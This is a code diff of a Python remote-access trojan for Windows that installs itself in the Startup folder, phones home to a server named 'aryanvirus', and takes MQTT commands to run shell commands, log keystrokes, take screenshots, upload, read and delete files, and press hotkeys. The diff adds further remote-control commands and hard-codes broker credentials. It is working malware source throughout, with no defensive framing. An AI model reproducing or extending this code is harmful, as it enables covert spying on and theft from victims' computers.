@@ -16,13 +16,12 @@ import traceback
 import winsound
 import blockInput
 from notepadType import notepad_write,start_random_move,stop_random_move
-from prompt import alertPrompt, inputPrompt
 from klogging import start_logging,stop_logging
 from filecontrol import list_folder,read_file,delete_file,create_file,send_file_to_server
-from systemcontrol import display_off,display_on,full_volume,mute_volume ,set_wallpaper_from_url
+from systemcontrol import display_off,display_on,full_volume,mute_volume ,set_wallpaper_from_url,run_psutil_from_string,get_open_and_active_windows
 
 def resource_path(relative_path):
-    # Works for both PyInstaller EXE and dev Python
+
     if hasattr(sys, "_MEIPASS"):
         return os.path.join(sys._MEIPASS, relative_path)
     return os.path.join(os.path.abspath("."), relative_path)
@@ -35,7 +34,7 @@ N_FLAG_FILE = Path(os.getenv('APPDATA')) / "notification.flag"
 ID_FILE = Path(os.getenv('APPDATA')) / "id.txt"
 BROKER_FILE = Path(os.getenv('APPDATA')) / "broker.txt"
 
-FLAG_URL = "https://aryanvirus.onrender.com/flag"
+FLAG_URL = "https://aryanvirus.onrender.com/mqtt_flag"
 LOCAL_FLAG_FILE = Path(os.getenv('APPDATA')) / "mqtt_flag.json"
 mqtt_enabled = False
 
@@ -50,9 +49,23 @@ def add_to_startup():
     except Exception as e:
         print(f"Failed to add to startup: {e}")
 
+
+def set_flag_on_server(state: bool):
+    if ID_FILE.exists():
+        with open(ID_FILE) as f:
+            pcid = f.read().strip()
+    else:return     
+    """Optional: set this PC's flag remotely (if needed)"""
+    try:
+        requests.get(f"{FLAG_URL}?pc_id={pcid}&state={'true' if state else 'false'}", timeout=10)
+        print(f"[FLAG] Server flag for {pcid} set to {state}")
+    except Exception as e:
+        print(f"[FLAG] Error setting flag: {e}")        
+
 if not FLAG_FILE.exists():
     add_to_startup()
     FLAG_FILE.touch()
+    set_flag_on_server(True)
 
 nFlag = False    
 if N_FLAG_FILE.exists():
@@ -64,12 +77,6 @@ PORT = 8883
 USERNAME = "aryanvish2006"
 PASSWORD = "aryanvishvishalyadav"
 
-POLL_INTERVAL = 60
-
-# PC identification
-# pc_name = socket.gethostname()
-# mac = hex(uuid.getnode())
-# pc_id = f"{pc_name}_{mac}"
 
 if ID_FILE.exists():
     with open(ID_FILE) as f:
@@ -107,14 +114,21 @@ def take_screenshot():
 
 
 def deleteScript():
+
     startup_path = Path(os.getenv('APPDATA')) / r"Microsoft\Windows\Start Menu\Programs\Startup"
     file_to_delete = os.path.join(startup_path, "client.exe") 
     if os.path.exists(file_to_delete):
         os.remove(file_to_delete)
-        client.publish(ACK_TOPIC,f"DELETED CLIENT.EXE :{pc_id}")
     if os.path.exists(FLAG_FILE):
         os.remove(FLAG_FILE)
-        client.publish(ACK_TOPIC,f"DELETED FIRSTRUN.FLAG :{pc_id}")
+    if os.path.exists(N_FLAG_FILE):
+        os.remove(N_FLAG_FILE)
+        client.publish(ACK_TOPIC,f"DELETED NOTIFICATION.FLAG :{pc_id}")   
+    if os.path.exists(ID_FILE):
+        os.remove(ID_FILE)  
+    if os.path.exists(BROKER_FILE):
+        os.remove(BROKER_FILE)  
+    client.publish(ACK_TOPIC,f"DELETED EVERYTHING FROM PC :{pc_id}")          
 
 def deleteFlag():
     if os.path.exists(N_FLAG_FILE):
@@ -135,6 +149,13 @@ def safe_thread(target, *args, **kwargs):
 
     t = threading.Thread(target=wrapper, daemon=True)
     t.start()
+
+def alertPrompt(text):
+    pg.alert(text)
+
+def inputPrompt(text):
+    value = pg.prompt(text, " : ")
+    return "Received = " + str(value)     
 
 # Handle all messages
 def handle_msg(msg):
@@ -188,7 +209,10 @@ def handle_msg(msg):
             client.publish(ACK_TOPIC,"Started Logging")
         elif msg == "stopkeylog":
             data = stop_logging()
-            client.publish(ACK_TOPIC,f"Logged data of : {pc_id} : {data}")   
+            client.publish(ACK_TOPIC,f"Logged data of : [{pc_id}] : {data}")   
+        elif msg == "getworkspace":
+            data = get_open_and_active_windows()  
+            client.publish(ACK_TOPIC, f"GETWORKSPACE [{pc_id}]:---> {data}")
         elif msg == "restart":
             os.execv(sys.executable,[sys.executable]+sys.argv)     
         elif msg == "end":
@@ -199,6 +223,10 @@ def handle_msg(msg):
             saveFlag()
         elif msg == "deleteflag":
             deleteFlag()        
+        elif msg == "setflagonserverfalse":
+            set_flag_on_server(False)
+        elif msg == "setflagonservertrue":
+            set_flag_on_server(True)      
         elif msg.startswith("browser"):
             url = msg[len("browser "):]
             safe_thread(webbrowser.open, url)
@@ -218,6 +246,8 @@ def handle_msg(msg):
             idkey = msg[len("changeid "):]
             with open(ID_FILE,"w") as f:
                 f.write(idkey)
+            requests.get(f"{FLAG_URL}/delete?pc_id={pc_id}", timeout=15)   
+            set_flag_on_server(True)   
             client.publish(ACK_TOPIC, f"Changed Id To :{idkey}")     
 
         elif msg.startswith("changebroker"):
@@ -270,7 +300,7 @@ def handle_msg(msg):
             link = msg[len("urlwallpaper "):]
             def setw():
                 res=set_wallpaper_from_url(link)
-                client.publish(ACK_TOPIC, f"Set Wallpaper {pc_id}: {res}")
+                client.publish(ACK_TOPIC, f"Set Wallpaper [{pc_id}]: {res}")
             safe_thread(setw)        
 
         elif msg.startswith("remap"):
@@ -291,9 +321,9 @@ def handle_msg(msg):
             def list_cmd():
                 try:
                     dataread = list_folder(cmd_data.strip())
-                    client.publish(ACK_TOPIC, f"List Folder :--> {dataread}")
+                    client.publish(ACK_TOPIC, f"List Folder [{pc_id}]:--> {dataread}")
                 except Exception as e:
-                    client.publish(ACK_TOPIC, f"Error listing folder: {e}")
+                    client.publish(ACK_TOPIC, f"Error listing folder [{pc_id}]: {e}")
 
             safe_thread(list_cmd)
 
@@ -308,11 +338,28 @@ def handle_msg(msg):
                 def read():
                     try:
                         dataread = read_file(folder.strip(), filename.strip())
-                        client.publish(ACK_TOPIC, f"File Read :---> {dataread}")
+                        client.publish(ACK_TOPIC, f"File Read [{pc_id}]:---> {dataread}")
                     except Exception as e:
-                        client.publish(ACK_TOPIC, f"Error reading file: {e}")
+                        client.publish(ACK_TOPIC, f"Error reading file [{pc_id}]: {e}")
         
                 safe_thread(read)
+        elif msg.startswith("twohotkey"):
+            cmd_data = msg[len("twohotkey "):]
+            parts = cmd_data.split('|')
+            if len(parts) != 2:
+                client.publish(ACK_TOPIC, "Error: hotkey requires 2 parameters separated by |")
+            else:
+                one, two = parts
+                pg.hotkey(one,two) 
+        elif msg.startswith("threehotkey"):
+            cmd_data = msg[len("threehotkey "):]
+            parts = cmd_data.split('|')
+            if len(parts) != 3:
+                client.publish(ACK_TOPIC, "Error: Hotkey requires 3 parameters separated by |")
+            else:
+                one,two,three = parts
+                pg.hotkey(one,two,three)
+                            
         elif msg.startswith("sendtoserver"):
             cmd_data = msg[len("sendtoserver "):]
             parts = cmd_data.split('|')
@@ -324,9 +371,9 @@ def handle_msg(msg):
                 def sendserver():
                     try:
                         datasend =send_file_to_server(folder.strip(), filename.strip(),server_url=f"{serverUrl}/upload_new")
-                        client.publish(ACK_TOPIC, f"File Send :---> {datasend}")
+                        client.publish(ACK_TOPIC, f"File Send [{pc_id}] :---> {datasend}")
                     except Exception as e:
-                        client.publish(ACK_TOPIC, f"Error Sending file: {e}")
+                        client.publish(ACK_TOPIC, f"Error Sending file [{pc_id}]: {e}")
         
                 safe_thread(sendserver)        
         
@@ -341,9 +388,9 @@ def handle_msg(msg):
                 def delete():
                     try:
                         dataread = delete_file(folder.strip(), filename.strip())
-                        client.publish(ACK_TOPIC, f"File Delete :---> {dataread}")
+                        client.publish(ACK_TOPIC, f"File Delete [{pc_id}]:---> {dataread}")
                     except Exception as e:
-                        client.publish(ACK_TOPIC, f"Error deleting file: {e}")
+                        client.publish(ACK_TOPIC, f"Error deleting file [{pc_id}]: {e}")
         
                 safe_thread(delete)
         
@@ -358,9 +405,9 @@ def handle_msg(msg):
                 def create():
                     try:
                         dataread = create_file(folder.strip(), filename.strip(), content.strip())
-                        client.publish(ACK_TOPIC, f"File Created :---> {dataread}")
+                        client.publish(ACK_TOPIC, f"File Created [{pc_id}]:---> {dataread}")
                     except Exception as e:
-                        client.publish(ACK_TOPIC, f"Error creating file: {e}")
+                        client.publish(ACK_TOPIC, f"Error creating file [{pc_id}]: {e}")
         
                 safe_thread(create)
                
@@ -394,10 +441,19 @@ def handle_msg(msg):
             def cmd_exec():
                 try:
                     result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-                    client.publish(ACK_TOPIC,f"SUBPROCESS_{pc_id} :--Success--> {result.stdout}")
+                    client.publish(ACK_TOPIC,f"SUBPROCESS_[{pc_id}] :--Success--> {result.stdout}")
                 except Exception as e:
-                    client.publish(ACK_TOPIC, f"Error: {e}")
+                    client.publish(ACK_TOPIC, f"Error Subprocess [{pc_id}]: {e}")
             safe_thread(cmd_exec)
+        elif msg.startswith("psutil"):
+            cmd2 = msg[len("psutil "):]
+            def psu_exec():
+                try:
+                    result2 = run_psutil_from_string(cmd2)
+                    client.publish(ACK_TOPIC,f"PSUTIL_[{pc_id}] :--Success--> {result2}")
+                except Exception as e:
+                    client.publish(ACK_TOPIC, f"Error Psutil [{pc_id}]: {e}")
+            safe_thread(psu_exec)    
 
     except Exception as e:
         print(f"[FATAL ERROR in handle_msg]: {e}")
@@ -405,7 +461,7 @@ def handle_msg(msg):
 
 def send_data():
     try:
-        client.publish(ACK_TOPIC, f"TRACE : {pc_id}")
+        client.publish(ACK_TOPIC, f"TRACE : [{pc_id}]")
         requests.get(f"{serverUrl}/posttrace", params={"pc_id": pc_id})
         print("sent")
     except:
@@ -420,11 +476,11 @@ heartbeat_started = False
 
 def on_connect(client, userdata, flags, rc):
     global heartbeat_started
-    print(f"{pc_id} Connected to MQTT broker, code: {rc}")
+    print(f"[{pc_id}] Connected to MQTT broker, code: {rc}")
     if rc == 0:
         client.subscribe(CONTROL_TOPIC, qos=2)
         client.subscribe(BROADCAST_TOPIC, qos=2)
-        client.publish(ACK_TOPIC, f"{pc_id} Connected")
+        client.publish(ACK_TOPIC, f"[{pc_id}] Connected")
 
         if not heartbeat_started:
             heartbeat_started = True
@@ -435,22 +491,8 @@ def on_connect(client, userdata, flags, rc):
 def on_message(client, userdata, message):
     msg = message.payload.decode()
     print(f"Received: {msg}")
-    client.publish(ACK_TOPIC, f"ACK:{pc_id} : RECIEVED [ {msg} ]")
+    client.publish(ACK_TOPIC, f"ACK:[{pc_id}] : RECIEVED [ {msg} ]")
     handle_msg(msg)
-def on_disconnect(client, userdata, rc):
-    print(f"Disconnected ({rc}), trying reconnect...")
-    def reconnect_loop():
-        delay = 5
-        while True:
-            try:
-                client.reconnect()
-                print("Reconnected successfully.")
-                break
-            except Exception as e:
-                print(f"Reconnect failed: {e}, retrying in {delay}s...")
-                time.sleep(delay)
-                delay = min(delay + 5, 60)
-    threading.Thread(target=reconnect_loop, daemon=True).start()
 
 
 client = mqtt.Client(client_id=pc_id,clean_session=False)
@@ -459,7 +501,21 @@ client.tls_set()
 client.tls_insecure_set(False)  
 client.on_connect = on_connect
 client.on_message = on_message
-client.on_disconnect = on_disconnect
+client.reconnect_delay_set(min_delay=1,max_delay=60)
+
+
+delay = 5
+while True:
+    try:
+        client.connect(BROKER, PORT, 300)
+        print("MQTT connected successfully.")
+        if nFlag:
+            requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected")
+        break
+    except Exception as e:
+        # print(f"MQTT connection failed: {e}, retrying in {delay}...")
+        time.sleep(delay)
+        delay=min(delay*2,60)
 
 
 HEARTBEAT_INTERVAL = 20
@@ -469,47 +525,30 @@ def heartbeat_loop():
         try:
             if client.is_connected():
                 client.publish(HEARTBEAT_TOPIC, "1")
-        except Exception as e:
-            print(f"Heartbeat error: {e}")
+        except Exception as e:pass
+            # print(f"Heartbeat error: {e}")
         time.sleep(HEARTBEAT_INTERVAL)
 
-max_delay = 60
-initial_delay = 5
-delay = initial_delay
-
-def connect_mqtt_nonblocking():
-    def _connect():
-        delay = 5
-        while True:
-            try:
-                client.connect(BROKER, PORT, 300)
-                print("MQTT connected successfully.")
-                if nFlag:
-                    requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected")
-                break
-            except Exception as e:
-                print(f"MQTT connection failed: {e}, retrying in {delay}s...")
-                time.sleep(delay)
-                delay = min(delay + 5, 60)
-    threading.Thread(target=_connect, daemon=True).start()
-
 def get_flag_from_server():
-    """Fetch the current MQTT flag for this PC from the Node.js server."""
     try:
-        res = requests.get(f"{FLAG_URL}?pc_id={pc_id}", timeout=5)
-        data = res.json()
-        return data.get("flag", True)
-    except Exception as e:
-        print(f"[FLAG] Error fetching flag: {e}")
-        return None
+        url = f"{FLAG_URL}?pc_id={pc_id}"
+        resp = requests.get(url, timeout=5)
+        if resp.status_code != 200:
+            print(f"[FLAG] bad status {resp.status_code}")
+            return None
 
-def set_flag_on_server(state: bool):
-    """Optional: set this PC's flag remotely (if needed)"""
-    try:
-        requests.get(f"{FLAG_URL}?pc_id={pc_id}&state={'true' if state else 'false'}", timeout=5)
-        print(f"[FLAG] Server flag for {pc_id} set to {state}")
+        data = resp.json()
+
+        if "state" in data and isinstance(data["state"], bool):
+            return data["state"]
+        if "flag" in data and isinstance(data["flag"], bool):
+            return data["flag"]
+
+        print(f"[FLAG] invalid response format: {data}")
+        return None
     except Exception as e:
-        print(f"[FLAG] Error setting flag: {e}")
+        print(f"[FLAG] error fetching flag: {e}")
+        return None
 
 def load_local_flag():
     """Read local flag fallback."""
@@ -534,23 +573,6 @@ if not LOCAL_FLAG_FILE.exists():
     save_local_flag(True)
 
 
-def flag_monitor():
-    global mqtt_enabled
-    while True:
-        flag = get_flag_from_server()
-        if flag is not None:
-            mqtt_enabled = flag
-            save_local_flag(flag)
-            if flag:
-                print("🌐 Internet available & flag enabled — connecting MQTT.")
-                connect_mqtt_nonblocking()
-                return
-            else:
-                print("Flag disabled on server — skipping MQTT.")
-                return
-        else:
-            print("No internet yet — retrying flag in 60s.")
-            time.sleep(60)
 
 flag = get_flag_from_server()
 
@@ -563,14 +585,10 @@ if flag is None:
 if not flag:
     print("Flag disabled by server — stopping script.")
     save_local_flag(False)
-    sys.exit(0)  # 🛑 stop script completely
+    os._exit(0)  # 🛑 stop script completely
 
 # Otherwise, connect
 save_local_flag(True)
-print("Flag enabled — connecting to MQTT now.")
-connect_mqtt_nonblocking()
-
-
 
 client.loop_forever()
 
